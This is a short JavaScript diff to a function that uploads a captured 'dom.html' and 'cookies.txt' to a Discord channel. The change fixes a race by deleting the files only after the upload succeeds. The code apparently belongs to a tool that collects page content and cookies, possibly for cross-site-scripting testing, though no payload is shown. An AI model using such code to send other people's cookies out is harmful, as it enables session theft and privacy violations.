@@ -161,12 +161,13 @@ function send_to_discord(messageContent, attachment_path = null) {
     if (attachment_path){
       channel.send({
         files: [`${attachment_path}/dom.html`, `${attachment_path}/cookies.txt`]
-      }).then(sentAttachment => console.log("Attachment sent!"))
+      }).then(sentAttachment => {
+        console.log("Attachment sent!");
+        fs.unlinkSync(`${attachment_path}/dom.html`);
+        fs.unlinkSync(`${attachment_path}/cookies.txt`);
+        fs.rmdirSync(`${attachment_path}`);
+      })
       .catch(error => console.error("Error sending message: " + error));
-
-      fs.unlinkSync(`${attachment_path}/dom.html`);
-      fs.unlinkSync(`${attachment_path}/cookies.txt`);
-      fs.rmdirSync(`${attachment_path}`);
     }
   } else {
     console.error(`Channel with ID ${discord_channel_id} not found.`);
